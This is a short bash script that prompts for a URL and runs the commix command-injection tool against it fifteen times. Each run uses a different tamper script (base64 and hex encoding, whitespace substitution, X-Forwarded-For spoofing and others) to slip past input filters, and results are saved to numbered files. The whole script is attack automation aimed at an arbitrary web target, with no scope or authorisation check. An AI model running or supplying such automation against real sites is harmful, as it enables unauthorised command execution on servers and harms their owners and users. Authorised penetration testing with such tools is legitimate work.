#!/bin/bash
echo -ne "[+] Enter URL w/ or w/ parameter: "
read target
echo -e "[~] Testing all payloads with tamper methods"
echo -e "[~] Files will be created as results 1 to 15 in txt format"
echo -e "[~] Automating results"
echo -e "[~] Please wait, this may take a while..."
echo "";
commix -u $target --all --tamper=base64encode.py > 1.txt
commix -u $target --all --tamper=backslashes.py > 2.txt 
commix -u $target --all --tamper=caret.py > 3.txt
commix -u $target --all --tamper=dollaratsigns.py > 4.txt
commix -u $target --all --tamper=hexencode.py > 5.txt 
commix -u $target --all --tamper=multiplespaces.py > 6.txt
commix -u $target --all --tamper=nested.py > 7.txt
commix -u $target --all --tamper=singlequotes.py > 8.txt
commix -u $target --all --tamper=sleep2timeout.py > 9.txt
commix -u $target --all --tamper=sleep2usleep.py > 10.txt
commix -u $target --all --tamper=space2htab.py > 11.txt
commix -u $target --all --tamper=space2ifs.py > 12.txt
commix -u $target --all --tamper=space2plus.py > 13.txt
commix -u $target --all --tamper=space2vtab.py > 14.txt
commix -u $target --all --tamper=xforwardedfor.py > 15.txt 
